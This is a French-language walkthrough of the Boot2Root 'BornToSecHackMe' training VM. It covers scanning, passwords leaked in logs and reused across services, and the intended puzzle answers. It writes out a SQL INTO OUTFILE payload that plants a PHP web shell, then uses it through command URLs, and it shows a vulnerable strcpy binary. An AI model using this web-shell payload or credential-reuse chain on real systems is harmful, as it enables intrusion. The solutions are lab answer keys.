# Boot2Root

```bash
sudo nmap -sN {iplocal}/24

Nmap scan report for BornToSecHackMe.lan (192.168.1.151)
Host is up (0.0070s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE         SERVICE
21/tcp  open|filtered ftp
22/tcp  open|filtered ssh
80/tcp  open|filtered http
143/tcp open|filtered imap
443/tcp open|filtered https
993/tcp open|filtered imaps
```

On decide de lancer un dirseach sur http://192.168.1.151 & https://192.168.1.151

```bash
Target: https://192.168.1.151/

[13:09:46] Starting:
[13:09:54] 403 -  242B  - /cgi-bin/
[13:09:57] 301 -  250B  - /forum  ->  https://192.168.1.151/forum/
[13:09:57] 200 -    2KB - /forum/
[13:10:02] 301 -  254B  - /phpmyadmin  ->  https://192.168.1.151/phpmyadmin/
[13:10:02] 200 -    2KB - /phpmyadmin/index.php
[13:10:02] 200 -    2KB - /phpmyadmin/
[13:10:04] 403 -  242B  - /server-status/
[13:10:04] 403 -  241B  - /server-status
[13:10:08] 403 -  255B  - /webmail/src/configtest.php
[13:10:08] 301 -  252B  - /webmail  ->  https://192.168.1.151/webmail/
```
sur le forum on voit des log du cron
```
Oct 5 08:45:25 BornToSecHackMe sshd[7545]: Received disconnect from 11.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:45:26 BornToSecHackMe sshd[7547]: Invalid user adam from 11.202.39.38
Oct 5 08:45:26 BornToSecHackMe sshd[7547]: input_userauth_request: invalid user adam [preauth]
Oct 5 08:45:27 BornToSecHackMe sshd[7547]: pam_unix(sshd:auth): check pass; user unknown
Oct 5 08:45:27 BornToSecHackMe sshd[7547]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=161.202.39.38-static.reverse.softlayer.com
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
```

on y voit cette ligne ou un potentiel password a ete mis a la place du user
```
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
```

on test avec tout les utilisateur visible dans user et BINGO !

```
user: lmezard
password: !q\]Ej?*5K5cy*AJ
```
en cliquant sur son profile on tombe sur son email donc on decide de tester le mail 
et le meme mot de passe sur https://192.168.1.151/webmail/src/login.php
```
laurie@borntosec.net
!q\]Ej?*5K5cy*AJ
```

On y voit un mail "DB access" avec le message 
```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

On utilise :

user: root
password: Fg-'kKXBj87E:aJ$

Et on accede a la DB et on injecte une page vulnerable a l'injection de commande pour pouvoir nous balader et decouvrire de potentiel info
```sql
SELECT "<?php system($_GET['cmd']) ?>" into outfile "/var/www/forum/templates_c/backdoor.php"
```

https://192.168.1.151/forum/templates_c/backdoor.php?cmd=ls+/home
https://192.168.1.151/forum/templates_c/backdoor.php?cmd=ls+/home/LOOKATME
https://192.168.1.151/forum/templates_c/backdoor.php?cmd=cat+/home/LOOKATME/password

on recupere
```
lmezard:G!@M6f4Eatau{sF"
```
on essaye de se connecter en ssh
```bash
(venv) ➜  ~ ssh lmezard@192.168.1.151
        ____                _______    _____
       |  _ \              |__   __|  / ____|
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
lmezard@192.168.1.151's password:
Permission denied, please try again.
lmezard@192.168.1.151's password:
```
mais sans succes on decide donc de tester en ftp

```bash
(venv) ➜  ~ ftp 192.168.1.151
Connected to 192.168.1.151.
220 Welcome on this server
Name (192.168.1.151:nerada): lmezard
331 Please specify the password.
Password:
230 Login successful.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
```
On get fun et README puis on voit
```bash
cat README
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```
Et dans le fun:
```
int main() {
	printf("M");
	printf("Y");
	printf(" ");
	printf("P");
	printf("A");
	printf("S");
	printf("S");
	printf("W");
	printf("O");
	printf("R");
	printf("D");
	printf(" ");
	printf("I");
	printf("S");
	printf(":");
	printf(" ");
	printf("%c",getme1());
	printf("%c",getme2());
	printf("%c",getme3());
	printf("%c",getme4());
	printf("%c",getme5());
	printf("%c",getme6());
	printf("%c",getme7());
	printf("%c",getme8());
	printf("%c",getme9());
	printf("%c",getme10());
	printf("%c",getme11());
	printf("%c",getme12());
	printf("\n");
	printf("Now SHA-256 it and submit");
}
```

puis avec le petit jeux de redirection on a:

Iheartpwnage

https://10015.io/tools/sha256-encrypt-decrypt

330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

du coup 

``` bash
➜  ~ ssh laurie@192.168.1.151
        ____                _______    _____
       |  _ \              |__   __|  / ____|
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
laurie@192.168.1.151's password:
laurie@BornToSecHackMe:~$ whoami
laurie
laurie@BornToSecHackMe:~$ ls
bomb  README
```

```bash
➜  ~ scp laurie@192.168.1.151:/home/laurie/bomb /Users/nerada/Desktop
        ____                _______    _____
       |  _ \              |__   __|  / ____|
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
laurie@192.168.1.151's password:
bomb                                          100%   26KB 593.0KB/s   00:00
➜  ~
```


Petit exercice de reverese
```
laurie@BornToSecHackMe:~$ cat README
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).

└─$ ./bomb
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Public speaking is very easy.
Phase 1 defused. How about the next one?
1 2 6 24 120 720
That's number 2.  Keep going!
1 b 214
Halfway there!
9
So you got that one.  Try this one.
opekmq
Good work!  On to the next...
4 2 6 3 1 5
Congratulations! You've defused the bomb!
```

Publicspeakingisveryeasy.126241207201b2149opekmq426135

on a un fichier turtle

```
Tourne gauche de 90 degrees
Avance 50 spaces
Avance 1 spaces
Tourne gauche de 1 degrees
Avance 1 spaces
Tourne gauche de 1 degrees
Avance 1 spaces
Tourne gauche de 1 degrees
....
Avance 1 spaces
Tourne droite de 1 degrees
Avance 1 spaces
Tourne droite de 1 degrees
Avance 1 spaces
Tourne droite de 1 degrees
Avance 50 spaces

Avance 100 spaces
Recule 200 spaces
Avance 100 spaces
Tourne droite de 90 degrees
Avance 100 spaces
Tourne droite de 90 degrees
Avance 100 spaces
Recule 200 spaces

Can you digest the message? :)
```

turtle en python est un bibliotheque pour le dessin 

```python
import turtle

t = turtle.Turtle()
t.forward(distance)
t.backward(distance)
t.left(angle)
t.right(angle)
```

on modifie directement les instrucions avec un search and replace sur vscode puis on obtiens 
le mot SLASH ecris un peu dans tous les sens.
On a un hint 'digest the message' qui nous ramene vers
hash message digest 5

donc SLASH devient

https://www.dcode.fr/md5-hash

646da671ca01bb5d84dbb5fb2238dc8e

```bash
(venv) ➜  Desktop ssh zaz@192.168.1.151
        ____                _______    _____
       |  _ \              |__   __|  / ____|
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
zaz@192.168.1.151's password:
zaz@BornToSecHackMe:~$
```

Derniere etape on a un binaire exploit_me:

```c
bool main(int param_1,int param_2)

{
  char local_90 [140];
  
  if (1 < param_1) {
    strcpy(local_90,*(char **)(param_2 + 4));
    puts(local_90);
  }
  return param_1 < 2;
}
```








